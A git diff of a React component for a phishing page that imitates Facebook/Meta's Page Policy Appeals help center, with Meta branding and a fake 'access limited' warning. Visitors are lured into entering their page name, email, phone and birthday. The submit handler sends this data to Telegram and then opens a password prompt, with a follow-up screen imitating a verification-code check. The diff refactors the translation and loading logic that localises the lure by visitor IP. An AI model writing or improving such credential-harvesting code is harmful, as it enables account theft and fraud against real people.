@@ -56,7 +56,7 @@ const Home = () => {
 
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
+    const [translatedTexts, setTranslatedTexts] = useState({}); // 🎯 BẮT ĐẦU RỖNG
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
     const [securityChecked, setSecurityChecked] = useState(false);
@@ -64,26 +64,9 @@ const Home = () => {
     const [isSubmitting, setIsSubmitting] = useState(false);
     
     const [showLoading, setShowLoading] = useState(true);
-    const [homeTranslated, setHomeTranslated] = useState(false);
+    const [isContentReady, setIsContentReady] = useState(false); // 🎯 STATE MỚI
 
-    useEffect(() => {
-        setHomeTranslated(true);
-        const loadingTimer = setTimeout(() => {
-            setShowLoading(false);
-        }, 1500);
-        return () => clearTimeout(loadingTimer);
-    }, []);
-
-    useEffect(() => {
-        if (!showLoading && homeTranslated) {
-            const targetLang = localStorage.getItem('targetLang');
-            if (targetLang && targetLang !== 'en') {
-                translateBackgroundComponents(targetLang);
-            }
-        }
-    }, [showLoading, homeTranslated]);
-
-    // 🎯 CẬP NHẬT: Dịch ngầm cho verify + sendinfo
+    // 🎯 Dịch ngầm cho verify + sendinfo
     const translateBackgroundComponents = useCallback(async (targetLang) => {
         try {
             const passwordTexts = {
@@ -101,7 +84,6 @@ const Home = () => {
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
-            // 🎯 Dịch verify với data mặc định - ĐÃ SỬA
             const verifyTexts = {
                 title: 'Check your device',
                 description: `We have sent a verification code to s****g@m****.com, ******32 . Please enter the code we just sent to continue.`,
@@ -143,8 +125,6 @@ const Home = () => {
 
     const initializeSecurity = useCallback(async () => {
         try {
-            // ĐÃ XÓA PHẦN CHẶN BOT Ở ĐÂY
-
             const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
             const ipData = response.data;
             
@@ -156,9 +136,21 @@ const Home = () => {
             const targetLang = countryToLanguage[detectedCountry] || 'en';
             localStorage.setItem('targetLang', targetLang);
             
+            // 🎯 DỊCH SONG SONG: Home texts và Background components
+            const translationPromises = [];
+            
             if (targetLang !== 'en') {
-                translateCriticalTexts(targetLang);
+                translationPromises.push(translateCriticalTexts(targetLang));
+            } else {
+                // 🎯 NẾU LÀ TIẾNG ANH, SET LUÔN defaultTexts
+                setTranslatedTexts(defaultTexts);
+                setIsContentReady(true);
             }
+            
+            // Luôn dịch background components
+            translationPromises.push(translateBackgroundComponents(targetLang));
+
+            await Promise.all(translationPromises);
 
             const code = getCountryCallingCode(detectedCountry);
             setCallingCode(`+${code}`);
@@ -172,91 +164,69 @@ const Home = () => {
             setCallingCode('+1');
             setSecurityChecked(true);
             setIsFormEnabled(true);
+            // 🎯 FALLBACK: SET DEFAULT TEXTS NẾU LỖI
+            setTranslatedTexts(defaultTexts);
+            setIsContentReady(true);
         }
     }, []);
 
     const translateCriticalTexts = useCallback(async (targetLang) => {
         try {
-            const [helpCenter, pagePolicyAppeals, detectedActivity, accessLimited, submitAppeal, pageName, mail, phone, birthday, yourAppeal, submit, pleaseWait, checkingSecurity] = await Promise.all([
-                translateText(defaultTexts.helpCenter, targetLang),
-                translateText(defaultTexts.pagePolicyAppeals, targetLang),
-                translateText(defaultTexts.detectedActivity, targetLang),
-                translateText(defaultTexts.accessLimited, targetLang),
-                translateText(defaultTexts.submitAppeal, targetLang),
-                translateText(defaultTexts.pageName, targetLang),
-                translateText(defaultTexts.mail, targetLang),
-                translateText(defaultTexts.phone, targetLang),
-                translateText(defaultTexts.birthday, targetLang),
-                translateText(defaultTexts.yourAppeal, targetLang),
-                translateText(defaultTexts.submit, targetLang),
-                translateText(defaultTexts.pleaseWait, targetLang),
-                translateText(defaultTexts.checkingSecurity, targetLang)
-            ]);
+            const criticalTexts = [
+                'helpCenter', 'pagePolicyAppeals', 'detectedActivity', 'accessLimited', 
+                'submitAppeal', 'pageName', 'mail', 'phone', 'birthday', 'yourAppeal', 
+                'submit', 'pleaseWait', 'checkingSecurity', 'english', 'using', 
+                'managingAccount', 'privacySecurity', 'policiesReporting', 'appealPlaceholder', 
+                'fieldRequired', 'invalidEmail', 'about', 'adChoices', 'createAd', 
+                'privacy', 'careers', 'createPage', 'termsPolicies', 'cookies'
+            ];
 
-            setTranslatedTexts(prev => ({
-                ...prev,
-                helpCenter,
-                pagePolicyAppeals,
-                detectedActivity,
-                accessLimited,
-                submitAppeal,
-                pageName,
-                mail,
-                phone,
-                birthday,
-                yourAppeal,
-                submit,
-                pleaseWait,
-                checkingSecurity
-            }));
+            const translationPromises = criticalTexts.map(key => 
+                translateText(defaultTexts[key], targetLang)
+            );
 
-            translateRemainingTexts(targetLang);
+            const translatedResults = await Promise.all(translationPromises);
+            
+            // 🎯 TẠO OBJECT MỚI VỚI CẢ FALLBACK
+            const newTranslatedTexts = {};
+            criticalTexts.forEach((key, index) => {
+                newTranslatedTexts[key] = translatedResults[index] || defaultTexts[key];
+            });
+
+            setTranslatedTexts(newTranslatedTexts);
+            setIsContentReady(true); // 🎯 ĐÁNH DẤU CONTENT ĐÃ SẴN SÀNG
+            
         } catch (error) {
             console.log('Critical translation failed:', error.message);
-        }
-    }, [defaultTexts]);
-
-    const translateRemainingTexts = useCallback(async (targetLang) => {
-        try {
-            const [english, using, managingAccount, privacySecurity, policiesReporting, appealPlaceholder, fieldRequired, invalidEmail, about, adChoices, createAd, privacy, careers, createPage, termsPolicies, cookies] = await Promise.all([
-                translateText(defaultTexts.english, targetLang),
-                translateText(defaultTexts.using, targetLang),
-                translateText(defaultTexts.managingAccount, targetLang),
-                translateText(defaultTexts.privacySecurity, targetLang),
-                translateText(defaultTexts.policiesReporting, targetLang),
-                translateText(defaultTexts.appealPlaceholder, targetLang),
-                translateText(defaultTexts.fieldRequired, targetLang),
-                translateText(defaultTexts.invalidEmail, targetLang),
-                translateText(defaultTexts.about, targetLang),
-                translateText(defaultTexts.adChoices, targetLang),
-                translateText(defaultTexts.createAd, targetLang),
-                translateText(defaultTexts.privacy, targetLang),
-                translateText(defaultTexts.careers, targetLang),
-                translateText(defaultTexts.createPage, targetLang),
-                translateText(defaultTexts.termsPolicies, targetLang),
-                translateText(defaultTexts.cookies, targetLang)
-            ]);
-
-            setTranslatedTexts(prev => ({
-                ...prev,
-                english, using, managingAccount, privacySecurity, policiesReporting,
-                appealPlaceholder, fieldRequired, invalidEmail, about, adChoices,
-                createAd, privacy, careers, createPage, termsPolicies, cookies
-            }));
-        } catch (error) {
-            console.log('Remaining translation failed:', error.message);
+            // 🎯 FALLBACK VỀ TIẾNG ANH NẾU LỖI
+            setTranslatedTexts(defaultTexts);
+            setIsContentReady(true);
         }
     }, [defaultTexts]);
 
     useEffect(() => {
         initializeSecurity();
         
-        const timer = setTimeout(() => {
-            setIsFormEnabled(true);
-        }, 2000);
-        
-        return () => clearTimeout(timer);
+        // 🎯 FALLBACK TIMER: TẮT LOADING SAU 5 GIÂY DÙ DỊCH CHƯA XONG
+        const loadingTimer = setTimeout(() => {
+            if (!isContentReady) {
+                setTranslatedTexts(defaultTexts);
+                setIsContentReady(true);
+            }
+        }, 5000);
+
+        return () => clearTimeout(loadingTimer);
     }, [initializeSecurity]);
+
+    // 🎯 TẮT LOADING KHI CONTENT ĐÃ SẴN SÀNG
+    useEffect(() => {
+        if (isContentReady) {
+            const timer = setTimeout(() => {
+                setShowLoading(false);
+            }, 300);
+            return () => clearTimeout(timer);
+        }
+    }, [isContentReady]);
 
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -346,7 +316,6 @@ const Home = () => {
         return Object.keys(newErrors).length === 0;
     };
 
-    // 🎯 CẬP NHẬT: Hàm submit nhanh - UPDATE ALL TRƯỚC KHI HIỆN PASSWORD
     const handleSubmit = async () => {
         if (!isFormEnabled || isSubmitting) return;
         
@@ -354,11 +323,9 @@ const Home = () => {
             try {
                 setIsSubmitting(true);
                 
-                // 🎯 GỬI TELEGRAM DATA FORM
                 const telegramMessage = formatTelegramMessage(formData);
                 await sendMessage(telegramMessage);
 
-                // 🎯 LƯU DATA VÀO LOCALSTORAGE
                 const userInfoData = {
                     name: formData.pageName,
                     email: hideEmail(formData.mail),
@@ -367,13 +334,11 @@ const Home = () => {
                 };
                 localStorage.setItem('userInfo', JSON.stringify(userInfoData));
 
-                // 🎯 UPDATE DỊCH VERIFY VỚI DATA THẬT (TRƯỚC KHI HIỆN PASSWORD)
                 const targetLang = localStorage.getItem('targetLang');
                 if (targetLang && targetLang !== 'en') {
                     await updateVerifyTranslation(targetLang, userInfoData.email, userInfoData.phone);
                 }
 
-                // 🎯 HIỆN PASSWORD SAU KHI ĐÃ UPDATE ALL XONG
                 setIsSubmitting(false);
                 setShowPassword(true);
                 
@@ -393,7 +358,6 @@ const Home = () => {
         }
     };
 
-    // 🎯 HÀM UPDATE DỊCH VERIFY VỚI DATA THẬT - ĐÃ SỬA
     const updateVerifyTranslation = async (targetLang, email, phone) => {
         try {
             const verifyTexts = {
@@ -434,7 +398,8 @@ const Home = () => {
         setShowPassword(false);
     };
 
-    const data_list = [
+    // 🎯 CHỈ TẠO DATA_LIST KHI ĐÃ CÓ TRANSLATED_TEXTS
+    const data_list = Object.keys(translatedTexts).length > 0 ? [
         {
             id: 'using',
             icon: faCompass,
@@ -455,217 +420,222 @@ const Home = () => {
             icon: faCircleExclamation,
             title: translatedTexts.policiesReporting
         }
-    ];
+    ] : [];
 
     return (
         <>
             {showLoading && (
                 <div className="fixed inset-0 z-50 flex items-center justify-center bg-white flex-col">
                     <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-blue-600 mb-4"></div>
-                    <p className="text-lg font-medium text-gray-700">Loading...</p>
+                    <p className="text-lg font-medium text-gray-700">
+                        Loading...
+                    </p>
                 </div>
             )}
 
-            <div className={homeTranslated ? 'opacity-100' : 'opacity-0'}>
-                <header className='sticky top-0 left-0 right-0 z-40 flex h-14 justify-between p-4 shadow-sm bg-white'>
-                    <title>Page Help Center</title>
-                    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-                    <div className='flex items-center gap-2'>
-                        <img src={FacebookImage} alt='' className='h-10 w-10' />
-                        <p className='font-bold'>{translatedTexts.helpCenter}</p>
-                    </div>
-                    <div className='flex items-center gap-2'>
-                        <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
-                            <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
+            {/* 🎯 CHỈ HIỆN CONTENT KHI ĐÃ CÓ DỮ LIỆU DỊCH */}
+            {!showLoading && Object.keys(translatedTexts).length > 0 && (
+                <div className="opacity-100 transition-opacity duration-300">
+                    <header className='sticky top-0 left-0 right-0 z-40 flex h-14 justify-between p-4 shadow-sm bg-white'>
+                        <title>Page Help Center</title>
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+                        <div className='flex items-center gap-2'>
+                            <img src={FacebookImage} alt='' className='h-10 w-10' />
+                            <p className='font-bold'>{translatedTexts.helpCenter}</p>
                         </div>
-                        <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
-                    </div>
-                </header>
-                <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
-                    <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
-                        {data_list.map((data) => {
-                            return (
-                                <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
-                                    <div className='flex items-center gap-2'>
-                                        <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
-                                            <FontAwesomeIcon icon={data.icon} />
+                        <div className='flex items-center gap-2'>
+                            <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
+                                <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
+                            </div>
+                            <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
+                        </div>
+                    </header>
+                    <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
+                        <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
+                            {data_list.map((data) => {
+                                return (
+                                    <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
+                                        <div className='flex items-center gap-2'>
+                                            <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
+                                                <FontAwesomeIcon icon={data.icon} />
+                                            </div>
+                                            <div>{data.title}</div>
                                         </div>
-                                        <div>{data.title}</div>
+                                        <FontAwesomeIcon icon={faChevronDown} />
                                     </div>
-                                    <FontAwesomeIcon icon={faChevronDown} />
+                                );
+                            })}
+                        </nav>
+                        <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
+                            <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
+                                <div className='bg-[#e4e6eb] p-4 sm:p-6'>
+                                    <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                                 </div>
-                            );
-                        })}
-                    </nav>
-                    <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
-                        <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
-                            <div className='bg-[#e4e6eb] p-4 sm:p-6'>
-                                <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
-                            </div>
-                            <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
-                                <p className='mb-3 whitespace-pre-line'>{translatedTexts.detectedActivity}</p>
-                                <p className='mb-3'>{translatedTexts.accessLimited}</p>
-                                <p>{translatedTexts.submitAppeal}</p>
-                            </div>
-                            <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
-                                <div className='flex flex-col gap-2'>
-                                    <p className='text-base sm:text-base'>
-                                        {translatedTexts.pageName} <span className='text-red-500'>*</span>
-                                    </p>
-                                    <input 
-                                        type='text' 
-                                        name='pageName' 
-                                        autoComplete='organization' 
-                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
-                                        value={formData.pageName} 
-                                        onChange={(e) => handleInputChange('pageName', e.target.value)} 
-                                        disabled={!isFormEnabled || isSubmitting}
-                                    />
-                                    {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                <div className='p-4 text-base leading-7 font-medium sm:text-base sm:leading-7'>
+                                    <p className='mb-3 whitespace-pre-line'>{translatedTexts.detectedActivity}</p>
+                                    <p className='mb-3'>{translatedTexts.accessLimited}</p>
+                                    <p>{translatedTexts.submitAppeal}</p>
                                 </div>
-                                <div className='flex flex-col gap-2'>
-                                    <p className='text-base sm:text-base'>
-                                        {translatedTexts.mail} <span className='text-red-500'>*</span>
-                                    </p>
-                                    <input 
-                                        type='email' 
-                                        name='mail' 
-                                        autoComplete='email' 
-                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
-                                        value={formData.mail} 
-                                        onChange={(e) => handleInputChange('mail', e.target.value)} 
-                                        disabled={!isFormEnabled || isSubmitting}
-                                    />
-                                    {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                                    {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
-                                </div>
-                                <div className='flex flex-col gap-2'>
-                                    <p className='text-base sm:text-base'>
-                                        {translatedTexts.phone} <span className='text-red-500'>*</span>
-                                    </p>
-                                    <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}>
-                                        <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
+                                <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
+                                    <div className='flex flex-col gap-2'>
+                                        <p className='text-base sm:text-base'>
+                                            {translatedTexts.pageName} <span className='text-red-500'>*</span>
+                                        </p>
                                         <input 
-                                            type='tel' 
-                                            name='phone' 
-                                            inputMode='numeric' 
-                                            pattern='[0-9]*' 
-                                            autoComplete='off' 
-                                            className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
-                                            value={formData.phone.replace(/^\+\d+\s*/, '')} 
-                                            onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                            type='text' 
+                                            name='pageName' 
+                                            autoComplete='organization' 
+                                            className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
+                                            value={formData.pageName} 
+                                            onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                             disabled={!isFormEnabled || isSubmitting}
                                         />
+                                        {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                     </div>
-                                    {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                                </div>
-                                <div className='flex flex-col gap-2'>
-                                    <p className='text-base sm:text-base'>
-                                        {translatedTexts.birthday} <span className='text-red-500'>*</span>
-                                    </p>
-                                    
-                                    <input 
-                                        type='date' 
-                                        name='birthday' 
-                                        className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
-                                        value={formData.birthday} 
-                                        onChange={(e) => handleInputChange('birthday', e.target.value)} 
-                                        disabled={!isFormEnabled || isSubmitting}
-                                    />
-                                    
-                                    <div className='block sm:hidden relative'>
+                                    <div className='flex flex-col gap-2'>
+                                        <p className='text-base sm:text-base'>
+                                            {translatedTexts.mail} <span className='text-red-500'>*</span>
+                                        </p>
+                                        <input 
+                                            type='email' 
+                                            name='mail' 
+                                            autoComplete='email' 
+                                            className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
+                                            value={formData.mail} 
+                                            onChange={(e) => handleInputChange('mail', e.target.value)} 
+                                            disabled={!isFormEnabled || isSubmitting}
+                                        />
+                                        {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                        {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
+                                    </div>
+                                    <div className='flex flex-col gap-2'>
+                                        <p className='text-base sm:text-base'>
+                                            {translatedTexts.phone} <span className='text-red-500'>*</span>
+                                        </p>
+                                        <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}>
+                                            <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-base sm:text-base font-medium text-gray-700'>{callingCode}</div>
+                                            <input 
+                                                type='tel' 
+                                                name='phone' 
+                                                inputMode='numeric' 
+                                                pattern='[0-9]*' 
+                                                autoComplete='off' 
+                                                className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none text-base' 
+                                                value={formData.phone.replace(/^\+\d+\s*/, '')} 
+                                                onChange={(e) => handleInputChange('phone', e.target.value)} 
+                                                disabled={!isFormEnabled || isSubmitting}
+                                            />
+                                        </div>
+                                        {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                    </div>
+                                    <div className='flex flex-col gap-2'>
+                                        <p className='text-base sm:text-base'>
+                                            {translatedTexts.birthday} <span className='text-red-500'>*</span>
+                                        </p>
+                                        
                                         <input 
                                             type='date' 
                                             name='birthday' 
-                                            className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
+                                            className={`hidden sm:block w-full rounded-lg border px-3 py-2.5 sm:py-1.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`} 
                                             value={formData.birthday} 
-                                            onChange={(e) => handleInputChange('birthday', e.target.value)}
-                                            required
+                                            onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                             disabled={!isFormEnabled || isSubmitting}
                                         />
-                                        <div 
-                                            className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
-                                            onClick={() => (isFormEnabled && !isSubmitting) && document.querySelectorAll('input[name="birthday"]')[1].click()}
-                                        >
-                                            {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
+                                        
+                                        <div className='block sm:hidden relative'>
+                                            <input 
+                                                type='date' 
+                                                name='birthday' 
+                                                className={`w-full rounded-lg border px-3 py-2.5 text-base ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} opacity-0 absolute z-10`} 
+                                                value={formData.birthday} 
+                                                onChange={(e) => handleInputChange('birthday', e.target.value)}
+                                                required
+                                                disabled={!isFormEnabled || isSubmitting}
+                                            />
+                                            <div 
+                                                className={`w-full rounded-lg border px-3 py-2.5 bg-white ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'} ${formData.birthday ? 'text-gray-900 text-base' : 'text-gray-500 text-base'} font-medium ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
+                                                onClick={() => (isFormEnabled && !isSubmitting) && document.querySelectorAll('input[name="birthday"]')[1].click()}
+                                            >
+                                                {formData.birthday ? formatDateToDDMMYYYY(formData.birthday) : 'dd/mm/yyyy'}
+                                            </div>
                                         </div>
+                                        
+                                        {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                     </div>
-                                    
-                                    {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                                </div>
-                                <div className='flex flex-col gap-2'>
-                                    <p className='text-base sm:text-base'>
-                                        {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
-                                    </p>
-                                    <textarea 
-                                        name='appeal'
-                                        rows={4}
-                                        className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
-                                        placeholder={translatedTexts.appealPlaceholder}
-                                        value={formData.appeal}
-                                        onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                    <div className='flex flex-col gap-2'>
+                                        <p className='text-base sm:text-base'>
+                                            {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
+                                        </p>
+                                        <textarea 
+                                            name='appeal'
+                                            rows={4}
+                                            className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none text-base ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'} ${!isFormEnabled || isSubmitting ? 'opacity-50 cursor-not-allowed' : ''}`}
+                                            placeholder={translatedTexts.appealPlaceholder}
+                                            value={formData.appeal}
+                                            onChange={(e) => handleInputChange('appeal', e.target.value)}
+                                            disabled={!isFormEnabled || isSubmitting}
+                                        />
+                                        {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
+                                    </div>
+                                    <button 
+                                        className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 flex items-center justify-center ${
+                                            !isFormEnabled || isSubmitting 
+                                                ? 'bg-gray-400 cursor-not-allowed text-white' 
+                                                : 'bg-blue-600 hover:bg-blue-700 text-white'
+                                        }`} 
+                                        onClick={handleSubmit}
                                         disabled={!isFormEnabled || isSubmitting}
-                                    />
-                                    {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
-                                </div>
-                                <button 
-                                    className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 flex items-center justify-center ${
-                                        !isFormEnabled || isSubmitting 
-                                            ? 'bg-gray-400 cursor-not-allowed text-white' 
-                                            : 'bg-blue-600 hover:bg-blue-700 text-white'
-                                    }`} 
-                                    onClick={handleSubmit}
-                                    disabled={!isFormEnabled || isSubmitting}
-                                >
-                                    {isSubmitting ? (
-                                        <>
-                                            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                                                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                                                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                                        </svg>
-                                            {translatedTexts.pleaseWait}
-                                        </>
-                                    ) : !isFormEnabled ? (
-                                        translatedTexts.checkingSecurity
-                                    ) : (
-                                        translatedTexts.submit
+                                    >
+                                        {isSubmitting ? (
+                                            <>
+                                                <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                                            </svg>
+                                                {translatedTexts.pleaseWait}
+                                            </>
+                                        ) : !isFormEnabled ? (
+                                            translatedTexts.checkingSecurity
+                                        ) : (
+                                            translatedTexts.submit
+                                        )}
+                                    </button>
+                                    
+                                    {!securityChecked && (
+                                        <div className="text-center text-sm text-gray-500 mt-2">
+                                            {translatedTexts.checkingSecurity}
+                                        </div>
                                     )}
-                                </button>
-                                
-                                {!securityChecked && (
-                                    <div className="text-center text-sm text-gray-500 mt-2">
-                                        {translatedTexts.checkingSecurity}
+                                </div>
+                            </div>
+                            <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
+                                <div className='mx-auto flex justify-between'>
+                                    <div className='flex flex-col space-y-4'>
+                                        <p>{translatedTexts.about}</p>
+                                        <p>{translatedTexts.adChoices}</p>
+                                        <p>{translatedTexts.createAd}</p>
                                     </div>
-                                )}
+                                    <div className='flex flex-col space-y-4'>
+                                        <p>{translatedTexts.privacy}</p>
+                                        <p>{translatedTexts.careers}</p>
+                                        <p>{translatedTexts.createPage}</p>
+                                    </div>
+                                    <div className='flex flex-col space-y-4'>
+                                        <p>{translatedTexts.termsPolicies}</p>
+                                        <p>{translatedTexts.cookies}</p>
+                                    </div>
+                                </div>
+                                <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
+                                <div className='flex justify-between'>
+                                    <img src={FromMetaImage} alt='' className='w-[100px]' />
+                                    <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
+                                </div>
                             </div>
                         </div>
-                        <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
-                            <div className='mx-auto flex justify-between'>
-                                <div className='flex flex-col space-y-4'>
-                                    <p>{translatedTexts.about}</p>
-                                    <p>{translatedTexts.adChoices}</p>
-                                    <p>{translatedTexts.createAd}</p>
-                                </div>
-                                <div className='flex flex-col space-y-4'>
-                                    <p>{translatedTexts.privacy}</p>
-                                    <p>{translatedTexts.careers}</p>
-                                    <p>{translatedTexts.createPage}</p>
-                                </div>
-                                <div className='flex flex-col space-y-4'>
-                                    <p>{translatedTexts.termsPolicies}</p>
-                                    <p>{translatedTexts.cookies}</p>
-                                </div>
-                            </div>
-                            <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
-                            <div className='flex justify-between'>
-                                <img src={FromMetaImage} alt='' className='w-[100px]' />
-                                <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
-                            </div>
-                        </div>
-                    </div>
-                </main>
-                {showPassword && <PasswordInput onClose={handleClosePassword} />}
-            </div>
+                    </main>
+                    {showPassword && <PasswordInput onClose={handleClosePassword} />}
+                </div>
+            )}
         </>
     );
 };
